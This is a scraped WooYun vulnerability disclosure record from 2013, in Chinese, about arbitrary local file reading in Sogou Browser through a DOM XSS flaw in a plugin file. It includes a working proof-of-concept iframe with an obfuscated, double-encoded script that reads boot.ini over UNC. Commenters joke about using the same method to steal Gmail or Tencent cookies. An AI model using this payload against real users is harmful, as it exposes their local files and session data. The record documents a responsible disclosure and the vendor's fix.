{"id": 8984, "wybug_id": "wooyun-2013-028832", "wybug_title": "搜狗浏览器任意文件读取漏洞", "wybug_corp": "搜狗", "wybug_author": "心伤的胖子", "wybug_date": "2013-07-14 12:41", "wybug_open_date": "2013-10-12 12:41", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "本地任意文件读取", "搜狗浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-12：\t细节向公众公开  简要描述： 搜狗浏览器对通过 UNC 访问 127.0.0.1 域限制一直比较宽松，之前就出现过本地文件存在 xss 漏洞，可以读取本地的任意文件的漏洞。结果是搜狗把本地文件的 xss 给修复，并没有对 UNC 访问 127.0.0.1 域做限制。 详细说明：  其实只要找个任意的本地文件的 xss 漏洞就可以通过该漏洞读取本地的任意文件。搜狗浏览器安装玩游戏插件后会把插件解压，解压后的文件夹下有如下的文件 C:\\Documents and Settings\\Administrator\\Application Data\\SogouExplorer\\Extension\\com.sogou.gamecenter\\0.6.0\\html\\balloon.html该文件存在 dom xss 漏洞，如下代码，从 location.href 取数据没有经过处理直接 document.write 操作，造成 xss 漏洞。\n<script type=\"text/javascript\">\tvar paramStr=location.href.split(\"?\")[1]\tvar debugUrl=\"http://fanjinhui.sogou-inc.com/d/balloom.html?\"+paramStr\tvar productUrl=\"http://wan.sogou.com/ad/gethtml.do?\"+paramStr\tvar theUrl=debug?debugUrl:productUrl;</script><script type=\"text/javascript\">\t\t\t\tdocument.write('<iframe src=\"'+theUrl+'\" id=\"ad-frame\" frameborder=\"0\" scrolling=\"no\" width=\"294\" height=\"190\"></iframe>')</script>\n   漏洞证明：  在任意页面上构造如下代码：\n<iframe width=100% height=100% src='\\\\127.0.0.1\\c$/DOCUME~1/Administrator/Application Data/SogouExplorer/Extension/com.sogou.gamecenter/0.6.0/html/balloon.html?\"></iframe><img src=a onerror=eval(unescape(unescape(\"xmlhttp%253Dnew%2520ActiveXObject%2528%2522Msxml2.XMLHTTP.3.0%2522%2529%253Bxmlhttp.open%2528%2522GET%2522%252C%2522file%253A////127.0.0.1/c%2524/boot.ini%2522%252Cfalse%2529%253Bxmlhttp.send%2528%2529%253Balert%2528xmlhttp.responseText%2529%253B\")))>'>\n就会读取本地的 boot.ini 文件，测试 xp sp3 / windows 2003 \n\n   修复方案：  限制 UNC 这种对 127.0.0.1 域的访问。   版权声明：转载请注明来源 心伤的胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-07-15 15:03 厂商回复： 收到，感谢提供 最新状态： 2013-10-12：确认已在新版本搜狗浏览器中修复此漏洞。  ", "replys": "漏洞评价：\n评论\n     2013-07-14 12:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  对了 如果都这样了 读取本地文件不如读取gmail的cookie好吧    \n     2013-07-14 12:47 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @xsser  猥琐至极 。。。猥琐至极啊。。。。。    \n     2013-07-14 13:36 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  只要知道文件的位置都应该是可以获取其内容的。    \n     2013-07-14 13:55 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @心伤的胖子 肯定读gmail啊 不解释    \n     2013-07-14 13:55 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @心伤的胖子 可以直接远程读gmail    \n     2013-07-14 14:01 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  ..Mark    \n     2013-07-14 14:52 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  @xsser 要不试试去？哈哈！    \n     2013-07-14 15:01 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  都揭露出来这可让b|jga怎么过呀...    \n     2013-07-14 18:18 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @xsser gmail的cookie问题是你读回来了有啥用？又登录不了别人的GMAIL看信，而且gmail现有的检测机制，发现你中途ip变了，直接锁好要手机验证码。    \n     2013-07-14 18:27 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @猪猪侠 那就读腾讯的，尽管有点没追求    \n     2013-07-14 21:45 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  瘦子回来了，瘦子是否变成了胖子？究竟真相如何？凶手究竟是谁？请关注明晚《乌云访谈》之《瘦子的不归路》。    \n     2013-07-14 21:51 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @xsser 读wooyun的比较好    \n     2013-07-14 22:15 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @小胖胖要减肥 好主意。。    \n     2013-07-15 10:35 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  @鬼魅羊羔 额，我是胖子。    \n     2013-07-15 11:26 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  @心伤的胖子 @小胖胖要减肥 一直好奇，你们俩是什么关系。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}